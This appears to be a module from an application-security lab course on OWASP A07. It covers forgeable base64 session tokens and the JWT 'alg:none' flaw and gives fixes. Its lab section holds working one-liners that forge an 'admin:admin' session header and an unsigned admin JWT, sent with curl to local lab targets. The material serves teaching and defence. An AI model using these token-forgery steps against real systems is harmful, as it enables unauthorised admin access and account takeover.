# 06 — Authentication, Sessions & JWT — OWASP A07

## Theory

Authentication proves who you are; a **session token** keeps you logged in after.
If that token is predictable or forgeable, an attacker mints their own and
becomes anyone.

Two classic flaws:
- **Forgeable session token:** the token just encodes `username:role` (e.g.
  base64). Anyone can craft `admin:admin`. Fix: a **random, server-side** token
  that means nothing on its own; the server maps it to a session.
- **JWT `alg:none`:** a JWT is `header.payload.signature`. If the server trusts
  the header's `alg` and accepts `none`, an attacker sends an unsigned token
  claiming to be admin. Fix: pin the algorithm, always verify the signature.

Add brute-force throttling and MFA for real systems.

## Lab

### A) Forge a session token (appsec-lab, running from module 00)
```bash
cd /workspaces/examto/appsec-lab
# Forge an admin token with NO login:
FORGED=$(python3 -c "import base64;print(base64.b64encode(b'admin:admin').decode())")
curl -s http://127.0.0.1:5000/api/account/1 -H "X-Session: $FORGED"
```
Accepted as admin — the token was forgeable.

### B) JWT alg:none (ctf-lab)
```bash
cd /workspaces/examto/ctf-lab
source .venv/bin/activate 2>/dev/null || (python3 -m venv .venv && source .venv/bin/activate && pip install -r requirements.txt)
python3 target/run_target.py &     # starts the CTF target on :5000 (stop the appsec app first)
sleep 2
TOKEN=$(python3 -c "import base64,json;b=lambda o:base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).decode().rstrip('=');print(b({'alg':'none','typ':'JWT'})+'.'+b({'user':'admin'})+'.')")
curl -s http://127.0.0.1:5000/ctf/jwt-admin -H "Authorization: Bearer $TOKEN"
```
You get the flag — an unsigned token was accepted as admin.

## Verify

- Forged `admin:admin` token is accepted (insecure).
- The `alg:none` JWT returns the admin flag.

## Key takeaways

- Session tokens must be random and server-side; carry no forgeable meaning.
- Never trust a JWT's own `alg`; pin it and verify the signature.
- Add rate limiting / lockout and MFA.
